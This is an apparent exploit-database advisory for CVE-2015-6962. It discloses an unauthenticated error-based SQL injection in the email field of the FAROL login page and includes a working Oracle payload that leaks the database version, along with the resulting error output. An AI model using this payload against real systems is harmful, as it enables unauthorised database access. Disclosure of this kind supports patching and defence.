@@ -1,0 +1,37 @@
+# Exploit Title: Web Application Farol with anauthenticated SQLi injection
+# Date: 2015-09-16
+# Exploit Author: Thierry Fernandes Faria [ a.k.a SoiL ] [ thierryfariaa (at) gmail (dot) com ]
+# Vendor Homepage:http://www.teiko.com.br/pt/solucoes/infraestrutura-em-ti/farol
+# Version: [All]
+# CVE : CVE-2015-6962
+# OWASP Top10: A1-Injection
+
++---------------------+
++ Product Description +
++---------------------+
+The FAROL web application is a software that monitors the databases
+ 
++----------------------+
++ Exploitation Details +
++----------------------+
+A vulnerability has been detected in the login page from  web application FAROL . Sql injection anauthenticated.
+
+The e-mail field at login page is vulnerable.
+
+The e-mail field is vulnerable to Error Based Sql injection.
+
+Vulnerable Page: http://target/tkmonitor/estrutura/login/Login.actions.php?recuperar
+Vulnerable POST Parameter: email
+Usage:email'[SQLi error based]--
+
+eg:
+email=1'%20or%201=ctxsys.drithsx.sn(1,(select%20sys.stragg(distinct%20banner)%20from%20v$version))--
+
+ORA-20000: Oracle Text error:
+DRG-11701: thesaurus CORE 11.2.0.4.0 ProductionNLSRTL Version 11.2.0.4.0 - ProductionOracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit ProductionPL/SQL Release 11.2.0.4.0 - ProductionTNS for Linux: Version 11.2.0.4.0 - Production does not exist
+ORA-06512: at "CTXSYS.DRUE", line 160
+
++----------+
++ Solution +
++----------+ 
+Upgrade the software
